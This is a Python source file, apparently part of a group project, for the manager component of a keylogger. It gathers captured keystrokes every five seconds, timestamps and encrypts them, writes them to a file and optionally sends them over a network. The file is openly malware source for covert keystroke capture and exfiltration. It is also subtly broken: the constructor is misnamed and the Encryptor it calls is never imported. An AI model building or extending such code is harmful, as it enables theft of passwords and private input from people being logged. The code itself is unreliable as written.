import time,datetime ,ctypes,threading
from kyllog import KeyLog
from FileWriter import FileWriter


class Manager:
    # current_time = '%d/%m/%Y  %H:%M'

    def _init_(self, keylogger, file_writer, network_writer = None):
        self.keylogger = keylogger
        self.file_writer = file_writer
        self.network_writer = network_writer
        self.buffer = []
        self.running = False

    def collect_keys(self):
        while self.running:
            try:
                time.sleep(5)
                logged_keys = self.keylogger.get_logged_keys()
                if logged_keys:
                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                    data = f"[{timestamp}] " + " ".join(logged_keys)
                    #הצפנה
                    encrypted_data = Encryptor.encrypt(data)
                    #מישהו צריך לעשות פונקציית הצפנה

                    #שליחה לקובץ
                    self.file_writer.write(encrypted_data)

                    #שליחה לרשת
                    if self.network_writer:
                        self.network_writer.send(encrypted_data)

                    #ניקוי
                    self.buffer.clear()
            except Exception as e:
                print(f"Error collecting keystrokes: {e}")

    def start(self):
        self.running = True
        self.keylogger.start_logging()
        threading.Thread(target=self.collect_keys, daemon=True).start()

    def stop(self):
        self.running = False
        self.keylogger.stop_logging()






    # def time_manager(self):
    #     self.time_man = datetime.datetime.fromtimestamp(self.logger.time).strftime(keylogger_manager.current_time)





























